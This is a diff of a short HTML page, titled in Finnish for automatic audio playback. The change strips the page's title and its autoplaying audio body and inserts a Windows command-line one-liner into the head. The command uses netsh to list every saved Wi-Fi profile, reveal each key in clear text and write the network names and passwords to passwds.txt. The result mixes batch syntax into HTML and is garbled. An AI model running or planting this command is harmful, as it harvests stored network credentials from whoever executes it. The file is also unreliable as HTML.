@@ -1,11 +1,7 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <title>Automaattinen äänitiedoston toisto</title>
+    for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @if "%j" NEQ "" (echo SSID: %j & netsh wlan show profiles %j key=clear | findstr "Key Content") >> passwds.txt
+    pause
   </head>
-  <body style="background-color: black;">
-    <audio autoplay>
-      <source src="example.wav" type="audio/wav">
-    </audio>
-  </body>
 </html>
